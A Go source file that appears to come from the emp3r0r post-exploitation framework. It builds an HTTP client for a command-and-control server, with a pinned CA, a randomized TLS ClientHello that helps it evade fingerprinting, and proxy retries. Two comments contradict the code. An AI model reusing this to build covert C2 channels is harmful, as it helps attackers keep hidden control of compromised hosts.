package tun

import (
	"crypto/x509"
	"encoding/pem"
	"log"
	"net/http"
	"net/url"
	"time"

	"github.com/fatih/color"
	utls "github.com/refraction-networking/utls"
)

var (

	// CACrt for TLS server cert signing
	CACrt = []byte(`
[emp3r0r_ca]
		`)
)

// EmpHTTPClient add our CA to trusted CAs, while keeps TLS InsecureVerify on
func EmpHTTPClient(c2_addr, proxyServer string) *http.Client {
	// start with an empty pool
	rootCAs := x509.NewCertPool()

	// C2 URL
	c2url, err := url.Parse(c2_addr)
	if err != nil {
		LogFatalError("Erro parsing C2 address '%s': %v", c2_addr, err)
	}

	// C2 host
	c2_host := c2url.Hostname()

	// add our cert
	if ok := rootCAs.AppendCertsFromPEM(CACrt); !ok {
		LogFatalError("No CA certs appended")
	}

	// Trust the augmented cert pool in our TLS client
	config := &utls.Config{
		ServerName:         c2_host,
		InsecureSkipVerify: false,
		RootCAs:            rootCAs,
	}

	// fingerprint of CA
	block, _ := pem.Decode(CACrt)
	ca_crt, _ := x509.ParseCertificate(block.Bytes)
	log.Printf("CA cert fingerprint: %s", SHA256SumRaw(ca_crt.Raw))

	// set proxyURL to nil to use direct connection for C2 transport
	proxyDialer, err := makeProxyDialer(nil, config, clientHelloIDMap["hellorandomizedalpn"])
	if proxyServer != "" {
		// use a proxy for our HTTP client
		proxyUrl, err := url.Parse(proxyServer)
		if err != nil {
			LogFatalError("Invalid proxy: %v", err)
		}

		proxyDialer, err = makeProxyDialer(proxyUrl, config, clientHelloIDMap["hellorandomizedalpn"])
	}

	// transport of our http client, with configured TLS client
	try := 0
init_transport:
	tr, err := makeTransport(c2url, clientHelloIDMap["hellorandomizedalpn"], config, proxyDialer)
	try++
	if err != nil {
		if proxyServer != "" && try < 5 {
			time.Sleep(3 * time.Second)
			log.Printf("Proxy server down, retrying (%d)...", try)
			goto init_transport
		} else {
			LogFatalError("makeRoundTripper: %v", err)
		}
	}

	return &http.Client{Transport: tr}
}

// LogFatalError print log in red, and exit
func LogFatalError(format string, a ...interface{}) {
	errorColor := color.New(color.Bold, color.FgHiRed)
	log.Fatal(errorColor.Sprintf(format, a...))
}

// LogInfo print log in blue
func LogInfo(format string, a ...interface{}) {
	infoColor := color.New(color.FgHiBlue)
	log.Print(infoColor.Sprintf(format, a...))
}

// LogError print log in red, and exit
func LogError(format string, a ...interface{}) {
	errorColor := color.New(color.Bold, color.FgHiRed)
	log.Printf(errorColor.Sprintf(format, a...))
}
